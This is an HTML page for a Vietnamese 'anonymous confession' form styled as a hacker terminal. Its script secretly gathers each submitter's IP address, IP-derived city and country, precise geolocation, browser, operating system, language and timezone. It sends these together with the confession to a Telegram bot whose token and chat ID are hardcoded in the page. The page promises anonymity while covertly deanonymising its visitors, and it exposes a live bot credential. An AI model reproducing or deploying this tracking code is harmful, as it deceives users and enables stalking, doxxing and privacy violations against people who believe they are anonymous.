<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Confession ·∫®n Danh - Hacker Style</title>
  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet" />
  <style>
    /* Reset & base */
    * {
      box-sizing: border-box;
      margin: 0; padding: 0;
      font-family: 'Share Tech Mono', monospace;
      color: #00ff99;
      background: #000;
    }
    body {
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      background: linear-gradient(135deg, #000000 0%, #004d00 100%);
      overflow-x: hidden;
    }
    main {
      background: rgba(0, 0, 0, 0.85);
      padding: 30px;
      border-radius: 12px;
      max-width: 450px;
      width: 100%;
      box-shadow: 0 0 15px #00ff99;
    }
    h1 {
      font-size: 2.5rem;
      text-align: center;
      margin-bottom: 20px;
      text-shadow: 0 0 10px #00ff99;
      user-select: none;
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 15px;
    }
    label {
      font-size: 0.9rem;
      margin-bottom: 5px;
      color: #00cc77;
    }
    input, textarea {
      background: #001100;
      border: 2px solid #004400;
      border-radius: 6px;
      color: #00ff99;
      font-family: monospace;
      font-size: 1rem;
      padding: 10px;
      outline-offset: 2px;
      outline-color: #00ff99;
      transition: border-color 0.3s ease;
    }
    input:focus, textarea:focus {
      border-color: #00ff99;
    }
    textarea {
      resize: vertical;
      min-height: 100px;
    }
    button {
      background: #00ff99;
      color: #000;
      font-weight: 700;
      font-size: 1.1rem;
      padding: 12px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      box-shadow: 0 0 12px #00ff99;
      transition: background-color 0.3s ease;
      user-select: none;
    }
    button:hover {
      background: #00cc77;
      box-shadow: 0 0 18px #00cc77;
    }
    #statusMsg {
      margin-top: 15px;
      text-align: center;
      font-weight: 700;
      color: #00ff99;
      text-shadow: 0 0 10px #00ff99;
      min-height: 24px;
      user-select: none;
    }
    /* reCAPTCHA container */
    .g-recaptcha {
      margin: 15px 0;
      user-select: none;
    }
  </style>
  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
</head>
<body>
  <main>
    <h1>üí¨ Confession ·∫®n Danh - Hacker Style</h1>
    <form id="confessionForm" autocomplete="off">
      <label for="message">N·ªôi dung confession <span style="color:#ff4444">*</span></label>
      <textarea id="message" name="message" placeholder="Vi·∫øt g√¨ ƒë√≥ ƒëi..." required></textarea>

      <label for="nickname">Nickname (t√πy ch·ªçn)</label>
      <input id="nickname" name="nickname" placeholder="T√™n ho·∫∑c b√≠ danh" type="text" maxlength="30" />

      <label for="facebook">Link Facebook (t√πy ch·ªçn)</label>
      <input id="facebook" name="facebook" placeholder="https://facebook.com/abc" type="url" />

      <label for="phone">S·ªë ƒëi·ªán tho·∫°i (t√πy ch·ªçn)</label>
      <input id="phone" name="phone" placeholder="0123456789" type="tel" pattern="[0-9]{6,15}" />

      <!-- Google reCAPTCHA v2 -->
      <div class="g-recaptcha" data-sitekey="6LdmQEUrAAAAAFXCMjsTCkriy1VkCRx6RAs-z2_j"></div>

      <button type="submit">G·ª≠i Confession</button>
    </form>
    <div id="statusMsg"></div>
  </main>

  <script>
    const token = "7315329822:AAEfzCe8NSQM6yvWH0zwzJxsvKYMvHxYhHU";
    const chatId = "5674777894";

    async function getGeolocation() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) return resolve(null);
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
          },
          () => resolve(null),
          { timeout: 7000 }
        );
      });
    }

    function getBrowserInfo() {
      const ua = navigator.userAgent;
      const parser = (() => {
        let tem, M = ua.match(/(opera|chrome|safari|firefox|edge|trident(?=\/))\/?\s*(\d+)/i) || [];
        if (/trident/i.test(M[1])) {
          tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
          return { name: 'IE', version: tem[1] || '' };
        }
        if (M[1] === 'Chrome') {
          tem = ua.match(/\b(OPR|Edg)\/(\d+)/);
          if (tem != null) {
            return { name: tem[1].replace('OPR', 'Opera').replace('Edg', 'Edge'), version: tem[2] };
          }
        }
        M = M[2] ? [M[1], M[2]] : [navigator.appName, navigator.appVersion, '-?'];
        return { name: M[0], version: M[1] };
      })();
      return parser;
    }

    document.getElementById('confessionForm').addEventListener('submit', async (e) => {
      e.preventDefault();

      const recaptchaResponse = grecaptcha.getResponse();
      if (!recaptchaResponse) {
        document.getElementById('statusMsg').textContent = "‚ùå Vui l√≤ng x√°c th·ª±c CAPTCHA tr∆∞·ªõc khi g·ª≠i!";
        return;
      }

      document.getElementById('statusMsg').textContent = "‚è≥ ƒêang x·ª≠ l√Ω...";

      const message = e.target.message.value.trim();
      if (!message) {
        document.getElementById('statusMsg').textContent = "‚ùå N·ªôi dung kh√¥ng ƒë∆∞·ª£c ƒë·ªÉ tr·ªëng!";
        return;
      }
      const nickname = e.target.nickname.value.trim() || "·∫®n danh";
      const facebook = e.target.facebook.value.trim() || "Kh√¥ng cung c·∫•p";
      const phone = e.target.phone.value.trim() || "Kh√¥ng cung c·∫•p";

      const browser = getBrowserInfo();
      const os = navigator.platform;
      const language = navigator.language;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const now = new Date().toLocaleString();

      // L·∫•y IP & v·ªã tr√≠ IP t·ª´ ipapi.co
      let ipData = { ip: "Kh√¥ng l·∫•y ƒë∆∞·ª£c IP", city: "Unknown", region: "Unknown", country: "Unknown" };
      try {
        const res = await fetch("https://ipapi.co/json/");
        if (res.ok) {
          ipData = await res.json();
        }
      } catch {}

      // L·∫•y location n·∫øu user ƒë·ªìng √Ω
      const geo = await getGeolocation();

      // G·ª≠i data
      const text = `
üì© Confession m·ªõi:

üìù N·ªôi dung: ${message}
üë§ Nickname: ${nickname}
üîó Facebook: ${facebook}
üìû SƒêT: ${phone}

üåê IP: ${ipData.ip}
üìç V·ªã tr√≠ IP: ${ipData.city}, ${ipData.region}, ${ipData.country_name}
üìå Location ch√≠nh x√°c: ${geo ? `Lat ${geo.lat.toFixed(5)}, Lon ${geo.lon.toFixed(5)}` : "Kh√¥ng c·∫•p quy·ªÅn"}

üßë‚Äçüíª Tr√¨nh duy·ªát: ${browser.name} v${browser.version}
üíª H·ªá ƒëi·ªÅu h√†nh: ${os}
üåê Ng√¥n ng·ªØ: ${language}
‚è∞ M√∫i gi·ªù: ${timezone}
üïí Th·ªùi gian g·ª≠i: ${now}
      `;

      // G·ª≠i Telegram
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text }),
      })
      .then(res => res.json())
      .then(data => {
        if (data.ok) {
          document.getElementById('statusMsg').textContent = "‚úÖ G·ª≠i th√†nh c√¥ng! C·∫£m ∆°n b·∫°n üíñ";
          e.target.reset();
          grecaptcha.reset();
        } else {
          document.getElementById('statusMsg').textContent = "‚ùå G·ª≠i th·∫•t b·∫°i, th·ª≠ l·∫°i sau!";
        }
      })
      .catch(() => {
        document.getElementById('statusMsg').textContent = "‚ö†Ô∏è L·ªói k·∫øt n·ªëi Telegram!";
      });
    });
  </script>
</body>
</html>
